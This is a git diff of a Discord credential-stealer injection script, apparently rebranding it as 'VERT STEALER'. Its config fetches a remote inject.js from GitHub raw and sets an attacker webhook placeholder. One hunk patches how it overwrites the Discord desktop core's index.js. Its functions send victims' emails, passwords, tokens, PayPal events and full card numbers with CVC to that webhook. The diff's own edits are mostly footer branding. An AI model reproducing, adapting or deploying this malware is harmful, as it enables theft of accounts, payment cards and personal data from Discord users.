@@ -6,16 +6,15 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%WEBHOOK%',
-  webhook_protector_key: '%WEBHOOK_KEY%',
-  auto_buy_nitro: false, 
+  webhook: '%WEBHOOK%', 
+  webhook_protector_key: '%WEBHOOK_KEY%', 
+  auto_buy_nitro: false,
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'KaZer Injection', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/1034609122336837642/1040801977501753465/jujutsu-kaisen-satoru-gojo-fond-d-ecran-2048x1152_49.jpg', 
-  embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com/KaZerCfx/INject/main/inject.js', 
-
+  embed_name: 'KAZER', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/961950134814535700/961987421879287878/IMG_9854.png'.replace(/ /g, '%20'), 
+  embed_color: 8363488,
+  injection_url: 'https://raw.githubusercontent.com/KaZerCfx/INject/inject.js', 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
@@ -412,8 +411,7 @@ function updateCheck() {
   const appPath = path.join(resourcePath, 'app');
   const packageJson = path.join(appPath, 'package.json');
   const resourceIndex = path.join(appPath, 'index.js');
-  const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]
-  const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
+  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
   const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
   if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
   if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
@@ -586,7 +584,7 @@ const getBadges = (flags) => {
       badges += 'Partnered Server Owner, ';
       break;
     case 131072:
-      badges += 'Verified Bot Developer, ';
+      badges += 'Discord Developer, ';
       break;
     case 4:
       badges += 'Hypesquad Event, ';
@@ -678,6 +676,9 @@ const login = async (email, password, token) => {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
+        footer: {
+          text: 'VERT STEALER',
+        },
       },
     ],
   };
@@ -716,6 +717,9 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
+        footer: {
+          text: 'VERT STEALER',
         },
       },
     ],
@@ -756,6 +760,9 @@ const emailChanged = async (email, password, token) => {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
+        footer: {
+          text: 'VERT STEALER',
+        },
       },
     ],
   };
@@ -795,6 +802,9 @@ const PaypalAdded = async (token) => {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
+        footer: {
+          text: 'VERT STEALER',
+        },
       },
     ],
   };
@@ -833,6 +843,9 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
+        footer: {
+          text: 'VERT STEALER',
         },
       },
     ],
@@ -874,6 +887,9 @@ const nitroBought = async (token) => {
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
+        footer: {
+          text: 'VERT STEALER',
         },
       },
     ],
